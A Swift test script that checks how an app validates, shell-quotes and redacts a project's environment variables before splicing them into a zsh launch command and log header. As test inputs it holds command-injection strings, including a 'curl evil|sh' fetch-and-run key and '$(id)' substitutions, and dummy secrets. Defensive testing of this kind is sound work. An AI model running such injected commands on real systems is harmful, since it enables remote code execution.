import Foundation

// Tests the launch-command builders in ProcessSupport — the one place user-controlled text (a
// project's env vars) is spliced into the command line `zsh -lc` executes, and into the log header
// that's shown in the app, written to disk and read by coding agents via `owl-monitor logs`.

var fail = 0
func chk(_ c: Bool, _ l: String, _ d: String = "") {
    print((c ? "PASS " : "FAIL ") + l + (d.isEmpty ? "" : " — " + d)); if !c { fail += 1 }
}
func env(_ pairs: (String, String)...) -> [Project.EnvVar] { pairs.map { .init(key: $0.0, value: $0.1) } }

// 1) Valid POSIX names only — the key is the one part of an assignment that can't be quoted.
for k in ["A", "_", "API_KEY", "_private", "db2", "NODE_ENV"] {
    chk(ProcessSupport.isValidEnvKey(k), "key accepted: \(k)")
}
for k in ["", "2FAST", "A B", "A;touch /tmp/pwn", "$(id)", "`id`", "A=B", "KEY-NAME", "ÑAME", "A\nB"] {
    chk(!ProcessSupport.isValidEnvKey(k), "key rejected: \(k.debugDescription)")
}

// 2) An injection attempt in a key is dropped, never emitted; valid neighbours survive.
let evil = ProcessSupport.envAssignments(env(("OK", "1"), ("X;curl evil|sh;Y", "2"), ("B", "3")))
chk(evil == "OK='1' B='3' ", "invalid key dropped from assignments", evil)
chk(!evil.contains("curl"), "no trace of the injected key")

// 3) Values are single-quoted, so shell syntax in them stays literal.
let quoted = ProcessSupport.envAssignments(env(("MSG", "it's $HOME `id` $(id)")))
chk(quoted == "MSG='it'\\''s $HOME `id` $(id)' ", "value quoted with ' escaped", quoted)
// …and the shell really does read it back verbatim.
let p = Process()
p.executableURL = URL(fileURLWithPath: "/bin/zsh")
p.arguments = ["-fc", "\(quoted)/usr/bin/printenv MSG"]
let out = Pipe(); p.standardOutput = out
try? p.run(); p.waitUntilExit()
let echoed = String(data: out.fileHandleForReading.readDataToEndOfFile(), encoding: .utf8) ?? ""
chk(echoed == "it's $HOME `id` $(id)\n", "zsh reads the value back literally", echoed.debugDescription)
chk(ProcessSupport.envAssignments([]) == "", "no env → empty prefix")
chk(ProcessSupport.envAssignments(env(("  PADDED ", "v"))) == "PADDED='v' ", "key whitespace trimmed")

// 4) The logged header never contains an env VALUE (secrets), but keeps the operational part.
let secret = env(("STRIPE_SECRET", "sk_live_abc123"), ("DATABASE_URL", "postgres://u:hunter2@db/x"))
let launch = "PORT=3000 exec pnpm start"
let header = ProcessSupport.displayCommand(env: secret, rest: launch, cwd: "/p")
chk(!header.contains("sk_live_abc123") && !header.contains("hunter2"), "header redacts env values", header)
chk(header.contains("STRIPE_SECRET=•••") && header.contains("DATABASE_URL=•••"), "header keeps env keys")
chk(header.hasPrefix("$ ") && header.contains(launch) && header.hasSuffix("(cwd: /p)"),
    "header keeps the command and cwd", header)
chk(ProcessSupport.envAssignments(secret, redacted: true) == "STRIPE_SECRET=••• DATABASE_URL=••• ",
    "redacted assignments")

print(fail == 0 ? "ALL PROCSUPPORT TESTS PASSED" : "\(fail) PROCSUPPORT TEST(S) FAILED")
exit(Int32(fail))
